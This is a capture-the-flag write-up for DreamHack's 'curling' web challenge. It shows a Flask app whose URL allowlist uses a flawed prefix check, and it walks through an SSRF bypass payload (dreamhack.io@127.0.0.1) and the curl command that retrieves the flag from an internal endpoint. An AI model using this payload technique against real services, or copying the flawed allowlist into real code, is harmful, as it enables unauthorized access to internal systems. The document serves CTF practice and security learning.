# curling — DreamHack

> **Room / Challenge:** curling (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** curling (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1816`
- **Level:** `2`
- **Date:** `19-11-2025`

---

## Goal

This service is vulnerable to SSRF, leveraging this to get the flag.

## My Solution

The app has two routes:

```python
ALLOWED_HOSTS = ['dreamhack.io', 'tools.dreamhack.io']

@app.route("/api/v1/test/curl", methods=["POST"])
def admin():
    url = request.form["url"].strip()
    for host in ALLOWED_HOSTS:
        if url.startswith('http://' + host):
            break

        return {'result': False, 'msg': 'Not Allowed host'}

    if url.endswith('/test/internal'):
        return {'result': False, 'msg': 'Not Allowed endpoint'}

    try:
        response = run(
            ["curl", f"{url}"], capture_output=True, text=True, timeout=1
        )
        return {'result': True, 'msg': response.stdout}

    except TimeoutExpired:
        return {'result': False, 'msg': 'Timeout'}


@app.route('/api/v1/test/internal', methods=["GET"])
def test():
    ip = request.remote_addr
    if not ip == '127.0.0.1':
        return {'result': False, 'msg': 'Only local access is allowed'}
    return {'result': True, 'msg': FLAG}
```

The `/api/v1/test/internal` is where the `FLAG` is served however we cannot access it normally from our machine

```bash
$ curl "http://host8.dreamhack.games:13399/api/v1/test/internal"

{"msg":"Only local access is allowed","result":false}
```

We have to leverage the route `/api/v1/test/curl` it has 2 checks condition:

```python
for host in ALLOWED_HOSTS:
    if url.startswith('http://' + host):
        break

    return {'result': False, 'msg': 'Not Allowed host'}

if url.endswith('/test/internal'):
    return {'result': False, 'msg': 'Not Allowed endpoint'}
```

The start host must be `dreamhack.io` or `tools.dreamhack.io`, also the end of URL mustn't be `/test/internal` so here is our payload:

```
http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal?bypass=true
```

The start host is `http://dreamhack.io` which is good also the endpoint is `/test/internal?bypass=true` which also pass the checks, you can test with this code:

```python
url = "http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal?bypass=true"

ALLOWED_HOSTS = ['dreamhack.io', 'tools.dreamhack.io']

for host in ALLOWED_HOSTS:
        if url.startswith('http://' + host):
            break

        print('NOT PASS HOST CHECK')

if url.endswith('/test/internal'):
    print('NOT PASS ENDPOINT CHECK')
```

This payload `@127.0.0.1:8000/api/v1/test/internal?bypass=true` is used to redirect the machine to `127.0.0.1:8000/api/v1/test/internal` where the flag is served. Use `curl` command to submit this url:

```bash
$ curl -X POST "http://host8.dreamhack.games:13399/api/v1/test/curl" -d "url=http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal?bypass=true"

{"msg":"{\"msg\":\"DH{S5Rf_1s_funNy:xxxxxxxxxxxxxxxxxxxx}\",\"result\":true}\n","result":true}
```

Got the flag !!
